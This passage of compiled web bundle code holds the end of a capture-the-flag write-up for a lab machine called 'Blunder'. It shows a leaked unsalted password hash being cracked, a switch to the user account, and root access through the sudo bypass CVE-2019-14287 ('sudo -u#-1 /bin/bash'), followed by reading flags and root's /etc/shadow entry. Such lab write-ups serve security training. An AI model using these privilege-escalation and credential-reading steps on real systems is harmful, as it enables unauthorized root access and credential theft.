"lastName": "",\n        "role": "User",\n        "password": "faca404fd5c0a31cf1897b823c695c85cffeb98d",\n        "email": "",\n        "registered": "2019-11-27 07:40:55",\n        "tokenRemember": "",\n        "tokenAuth": "b380cb62057e9da47afce66b4615107d",\n        "tokenAuthTTL": "2009-03-15 14:00",\n        "twitter": "",\n        "facebook": "",\n        "instagram": "",\n        "codepen": "",\n        "linkedin": "",\n        "github": "",\n        "gitlab": ""}\n}\n')),(0,r.kt)("p",null,"And this time no salt it used. So let's try the hash on\n",(0,r.kt)("a",{parentName:"p",href:"https://crackstation.net/"},"CrackStation"),"."),(0,r.kt)("p",null,"The password is: ",(0,r.kt)("inlineCode",{parentName:"p"},"Password120"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"www-data@blunder:/var/www$ su hugo\nPassword:\n\nhugo@blunder:~$ cat user.txt\n9b8099236a4c7efcad6bf60293d921e5\n\nhugo@blunder:~$ id\nuid=1001(hugo) gid=1001(hugo) groups=1001(hugo)\n")),(0,r.kt)("h2",{id:"privilege-escalation-of-machine--from-hugo-to-root"},"Privilege Escalation of Machine : from hugo to root"),(0,r.kt)("p",null,"We can launch a bash shell as any user except root:"),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"hugo@blunder:~$ sudo -l\nPassword:\n\nMatching Defaults entries for hugo on blunder:\n    env_reset, mail_badpass,\n    secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser hugo may run the following commands on blunder:\n    (ALL, !root) /bin/bash\n")),(0,r.kt)("p",null,"But that's in theory, because we can use ",(0,r.kt)("inlineCode",{parentName:"p"},"sudo < 1.8.28 - Security Bypass"),"\n(CVE-2019-14287), see ",(0,r.kt)("a",{parentName:"p",href:"https://www.exploit-db.com/exploits/47502"},"EDB-47502"),"."),(0,r.kt)("pre",null,(0,r.kt)("code",{parentName:"pre"},"hugo@blunder:~$ sudo --version\nsudo --version\nSudo version 1.8.25p1\nSudoers policy plugin version 1.8.25p1\nSudoers file grammar version 46\nSudoers I/O plugin version 1.8.25p1\n\nhugo@blunder:~$ sudo -u#-1 /bin/bash\n\nroot@blunder:/home/hugo# id\nuid=0(root) gid=1001(hugo) groups=1001(hugo)\n\nroot@blunder:/# cat /root/root.txt\ndf815831c59461a89906cac16c662282\n\nroot@blunder:/# cat /etc/shadow | grep root\nroot:$6$GmdDkez55tk.8Dvd$qDfa.WwHrKSBCswEaWLaSwFNCeNroew0pyxbsg8uO8a2/uq.XelP9Q/u5Cb9cBxO6hSyaVqt1lfU.3omw0ThC0:18228:0:99999:7:::\n")),(0,r.kt)("p",null,"I wonder if there was a way to root via the shuan account."),(0,r.kt)("p",null,":"))}c.isMDXComponent=!0},87802:(e,n,t)=>{t.d(n,{Z:()=>a});const a=t.p+"assets/images/blunder-c051fdbea14583a4e43d5fad81f149ea.png"}}]);